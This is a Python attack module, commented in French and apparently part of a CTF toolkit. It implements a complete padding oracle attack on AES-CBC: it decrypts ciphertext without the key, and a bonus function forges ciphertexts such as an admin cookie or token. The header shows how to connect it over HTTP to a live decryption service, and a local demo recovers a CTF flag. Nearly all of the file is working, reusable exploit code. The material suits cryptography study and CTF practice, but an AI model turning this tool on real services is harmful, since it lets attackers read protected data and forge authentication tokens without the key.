#!/usr/bin/env python3
"""
================================================
ARSENAL/CRYPTO — Padding Oracle Attack (AES-CBC)
================================================
Attaque : Padding Oracle byte-by-byte (Vaudenay, 2002)
Contexte : un service déchiffre un ciphertext AES-CBC et révèle
uniquement si le padding PKCS#7 est valide ou non — jamais le clair.

Principe :
    plaintext[i] = D(ciphertext[i]) XOR ciphertext[i-1]

    D = déchiffrement AES bloc-à-bloc SANS la clé. En forgeant un bloc
    précédent factice et en observant si l'oracle valide le padding,
    on retrouve l'octet intermédiaire D(ciphertext[i]) octet par octet,
    de la fin du bloc vers le début — jamais besoin de connaître la clé.

Ce module est écrit pour être IMPORTÉ : tu fournis ta propre fonction
`oracle(iv_or_prev_block: bytes, block: bytes) -> bool` qui parle au
vrai service (HTTP, socket, appel local...), et decrypt_cbc() fait tout
le reste.

Usage typique (oracle réseau) :

    import requests
    def oracle(prev_block, target_block):
        r = requests.post("http://cible/decrypt",
                           data={"iv": prev_block.hex(), "ct": target_block.hex()})
        return r.json()["padding_valid"] is True

    from padding_oracle_attack import decrypt_cbc
    pt = decrypt_cbc(oracle, iv, ciphertext, block_size=16)
    print(pt)

Piège classique (géré ici) : pour pad_val=1, un octet forgé peut
accidentellement produire un padding valide plus long (ex: 0x02 0x02)
que celui recherché (0x01) → on lève l'ambiguïté en modifiant
l'avant-dernier octet forgé et en revérifiant que l'oracle répond
toujours positif.

Auteur : Xeno CTF Arsenal
================================================
"""

from typing import Callable

Oracle = Callable[[bytes, bytes], bool]


def decrypt_block(oracle: Oracle, prev_block: bytes, target_block: bytes,
                   block_size: int = 16, verbose: bool = False) -> bytes:
    """Déchiffre UN bloc de ciphertext via l'oracle de padding."""
    intermediate = bytearray(block_size)
    known = bytearray(block_size)

    for pad_val in range(1, block_size + 1):
        pos = block_size - pad_val
        forged = bytearray(block_size)
        for i in range(pos + 1, block_size):
            forged[i] = intermediate[i] ^ pad_val

        found = False
        for guess in range(256):
            forged[pos] = guess
            if oracle(bytes(forged), target_block):
                if pad_val == 1:
                    # Écarte le faux positif (ex: 0x02 0x02 confondu avec 0x01)
                    forged2 = bytearray(forged)
                    forged2[pos - 1] ^= 0xFF
                    if not oracle(bytes(forged2), target_block):
                        continue
                intermediate[pos] = guess ^ pad_val
                known[pos] = intermediate[pos] ^ prev_block[pos]
                found = True
                if verbose:
                    print(f"    pos={pos:2d} pad_val={pad_val:2d} -> "
                          f"octet clair = {chr(known[pos]) if 32 <= known[pos] < 127 else hex(known[pos])}")
                break

        if not found:
            raise RuntimeError(
                f"Aucun octet valide trouvé pour pos={pos} (pad_val={pad_val}). "
                "L'oracle est-il fiable ? Bon block_size ?"
            )

    return bytes(known)


def decrypt_cbc(oracle: Oracle, iv: bytes, ciphertext: bytes,
                 block_size: int = 16, strip_padding: bool = True,
                 verbose: bool = False) -> bytes:
    """
    Déchiffre un ciphertext AES-CBC complet (plusieurs blocs) via l'oracle
    de padding, sans jamais connaître la clé.
    """
    if len(ciphertext) % block_size != 0:
        raise ValueError("Le ciphertext n'est pas un multiple de block_size.")

    blocks = [iv] + [ciphertext[i:i + block_size]
                      for i in range(0, len(ciphertext), block_size)]

    plaintext = b""
    for i in range(1, len(blocks)):
        if verbose:
            print(f"[*] Bloc {i}/{len(blocks) - 1}...")
        plaintext += decrypt_block(oracle, blocks[i - 1], blocks[i], block_size, verbose)

    if strip_padding:
        pad_len = plaintext[-1]
        if 1 <= pad_len <= block_size and plaintext[-pad_len:] == bytes([pad_len]) * pad_len:
            plaintext = plaintext[:-pad_len]

    return plaintext


def encrypt_cbc_via_oracle(oracle: Oracle, plaintext: bytes, block_size: int = 16) -> bytes:
    """
    Bonus : forge un ciphertext qui déchiffrera vers `plaintext` de ton
    choix, en utilisant le même oracle (sans jamais connaître la clé).
    Utile si le challenge demande de forger un cookie/token admin=True.
    """
    pad_len = block_size - (len(plaintext) % block_size)
    padded = plaintext + bytes([pad_len]) * pad_len
    blocks = [padded[i:i + block_size] for i in range(0, len(padded), block_size)]

    # On part d'un dernier bloc de ciphertext arbitraire (souvent des zéros)
    result_blocks = [bytes(block_size)]  # dernier bloc "cible" choisi arbitrairement

    for block in reversed(blocks):
        target = result_blocks[0]
        # On retrouve intermediate(target) comme dans decrypt_block, puis
        # on choisit prev_block = intermediate XOR notre plaintext voulu.
        intermediate = bytearray(block_size)
        for pad_val in range(1, block_size + 1):
            pos = block_size - pad_val
            forged = bytearray(block_size)
            for i in range(pos + 1, block_size):
                forged[i] = intermediate[i] ^ pad_val
            for guess in range(256):
                forged[pos] = guess
                if oracle(bytes(forged), target):
                    if pad_val == 1:
                        forged2 = bytearray(forged)
                        forged2[pos - 1] ^= 0xFF
                        if not oracle(bytes(forged2), target):
                            continue
                    intermediate[pos] = guess ^ pad_val
                    break

        new_prev = bytes(b1 ^ b2 for b1, b2 in zip(intermediate, block))
        result_blocks.insert(0, new_prev)

    return b"".join(result_blocks)


# ============================================================
# DÉMO LOCALE (pour tester le module sans réseau)
# ============================================================
if __name__ == "__main__":
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
    except ImportError:
        print("[-] pip install pycryptodome pour lancer la démo locale.")
        raise SystemExit(1)

    import os

    KEY = os.urandom(16)
    BLOCK = 16

    def local_oracle(iv_fake: bytes, block: bytes) -> bool:
        cipher = AES.new(KEY, AES.MODE_CBC, iv_fake)
        pt = cipher.decrypt(block)
        pad_len = pt[-1]
        if not (1 <= pad_len <= BLOCK):
            return False
        return pt[-pad_len:] == bytes([pad_len]) * pad_len

    secret = b"EthACTF{p4dd1ng_0r4cl3_byte_by_byte_cbc_1s_fr4g1le}"
    iv = os.urandom(BLOCK)
    ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(secret, BLOCK))

    print("[*] Démo locale — attaque du padding oracle sans connaître la clé...")
    recovered = decrypt_cbc(local_oracle, iv, ct, block_size=BLOCK, verbose=False)
    print(f"[!!!] Texte récupéré : {recovered.decode()}")
    assert recovered == secret
    print("[+] Vérification OK — identique au secret original.")
